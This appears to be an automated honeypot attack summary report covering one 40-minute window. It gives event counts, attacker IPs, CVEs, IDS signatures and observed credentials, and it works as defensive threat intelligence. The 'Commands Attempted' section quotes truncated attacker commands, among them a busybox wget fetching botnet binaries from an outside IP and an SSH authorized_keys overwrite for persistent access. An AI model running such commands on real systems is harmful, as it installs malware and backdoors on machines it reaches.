**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-01T06:01:32Z
**Timeframe:** 2025-10-01T05:20:01Z to 2025-10-01T06:00:01Z
**Log Files Analyzed:**
- agg_log_20251001T052001Z.json
- agg_log_20251001T054001Z.json
- agg_log_20251001T060001Z.json

---

### **Executive Summary**

This report summarizes 23,310 events recorded across the honeypot network. The majority of activity was captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force attacks and command execution attempts. The most prominent attacker IP was `161.35.152.121`. Activity primarily targeted SMB (port 445) and SSH (port 22). Attackers were observed attempting to download and execute malicious binaries (notably `urbotnetisass` variants) and manipulating SSH authorized keys for persistent access. Suricata alerts were dominated by signatures related to the DoublePulsar backdoor, suggesting attempts to exploit vulnerabilities associated with the EternalBlue family.

---

### **Detailed Analysis**

**Attacks by Honeypot**
- **Cowrie:** 11,879
- **Suricata:** 2,760
- **Dionaea:** 2,011
- **Honeytrap:** 1,625
- **Mailoney:** 829
- **Ciscoasa:** 944
- **H0neytr4p:** 103
- **Tanner:** 78
- **Honeyaml:** 27
- **ConPot:** 23
- **Adbhoney:** 13
- **Miniprint:** 10
- **ElasticPot:** 8
- **Sentrypeer:** 4
- **Redishoneypot:** 3
- **Ipphoney:** 1

**Top Attacking IPs**
- `161.35.152.121`: 8,425
- `45.130.190.34`: 1,634
- `79.126.20.146`: 1,450
- `218.17.50.212`: 1,268
- `92.242.166.161`: 824
- `146.190.154.85`: 480
- `194.226.49.149`: 385
- `185.156.73.166`: 363
- `92.63.197.55`: 353
- `92.63.197.59`: 330
- `185.156.73.167`: 247
- `209.97.161.72`: 322
- `218.161.90.126`: 309
- `103.179.56.44`: 292
- `40.115.18.231`: 312
- `103.118.114.22`: 233
- `175.207.13.86`: 154
- `34.80.155.91`: 167

**Top Targeted Ports/Protocols**
- `445` (includes `TCP/445`): 4,499
- `22` (includes `TCP/22`): 2,041
- `25`: 829
- `80` (includes `TCP/80`): 111
- `8333`: 102
- `443`: 103
- `23`: 129
- `3306`: 22
- `1521`: 36

**Most Common CVEs**
- CVE-2002-0013, CVE-2002-0012
- CVE-1999-0517
- CVE-2024-3721
- CVE-2019-11500
- CVE-1999-0183
- CVE-2024-4577
- CVE-2002-0953
- CVE-2006-2369
- CVE-2021-41773
- CVE-2021-42013

**Commands Attempted by Attackers**
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >>.ssh/authorized_keys && ...`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `uname -a`
- `Enter new UNIX password:`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{...}'`
- `crontab -l`
- `whoami`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/[file]; ...`
- `echo -e "\\x6F\\x6B"`

**Signatures Triggered**
- `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication` (2024766)
- `ET DROP Dshield Block Listed Source group 1` (2402000)
- `ET SCAN NMAP -sS window 1024` (2009582)
- `ET INFO Reserved Internal IP Traffic` (2002752)
- `ET CINS Active Threat Intelligence Poor Reputation IP` (various groups)
- `ET DROP Spamhaus DROP Listed Traffic Inbound` (various groups)

**Users / Login Attempts**
- `345gs5662d34` / `345gs5662d34`
- `root` / `nPSpP4PBW0`
- `paul` / `paul123`
- `ais` / `ais123`
- `minecraft` / `3245gs5662d34`
- `foundry` / `foundry`
- `sa` /
- `root` / `MoeClub.org`
- `admin` / (various passwords)
- `asterisk` / `asterisk123`

**Files Uploaded/Downloaded**
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`
- `sh`
- `azenv.php`
- `welcome.jpg)`
- `writing.jpg)`
- `tags.jpg)`

**HTTP User-Agents**
- *No significant HTTP User-Agent data was observed in this period.*

**SSH Clients and Servers**
- *No specific SSH client or server version data was logged in this period.*

**Top Attacker AS Organizations**
- *No attacker AS organization data was available in the logs for this period.*

---

### **Key Observations and Anomalies**

1.  **High-Volume Coordinated Attacks:** The IP `161.35.152.121` was responsible for a significant portion of the total events, primarily targeting the Cowrie honeypot with a large number of login attempts and subsequent reconnaissance commands. This suggests an automated, large-scale attack campaign.
2.  **SSH Key Manipulation:** A frequently observed command sequence involves removing the existing `.ssh` directory and adding a specific public SSH key to `authorized_keys`. This is a clear attempt to establish persistent, passwordless access to compromised systems.
3.  **Malware Delivery:** The commands executed via the Adbhoney and Cowrie honeypots consistently attempt to download and run binaries with names like `*.urbotnetisass` from the IP `94.154.35.154`. This indicates a botnet propagation campaign targeting various architectures (ARM, x86, MIPS).
4.  **DoublePulsar Activity:** The prevalence of the DoublePulsar signature from Suricata indicates that attackers are still actively scanning for and attempting to exploit the SMB vulnerabilities associated with the EternalBlue exploit (MS17-010). This remains a significant threat vector.
